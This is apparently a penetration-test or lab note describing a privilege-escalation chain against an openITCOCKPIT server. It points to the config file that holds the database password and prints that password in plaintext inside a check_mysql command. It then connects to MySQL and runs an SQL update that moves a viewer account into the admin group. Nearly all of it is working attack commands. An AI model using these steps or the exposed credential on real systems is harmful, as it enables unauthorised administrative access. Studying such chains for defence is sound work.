db password can be found in: /etc/openitcockpit/app/Config/database.php
we can check that the password is indeed valid using:
./check_mysql -d openitcockpit -H localhost -P 3306 -u openitcockpit -p eloCRIuPt6qg
connect to mysql:
mysql -u openitcockpit -h localhost -p openitcockpit
promote viewer user to admin:
update users set usergroup_id = 1 where email='view@viewer.local';
we can verify that the viewer user indeed has admin priviledges by attempt to create a user in the administration tab.
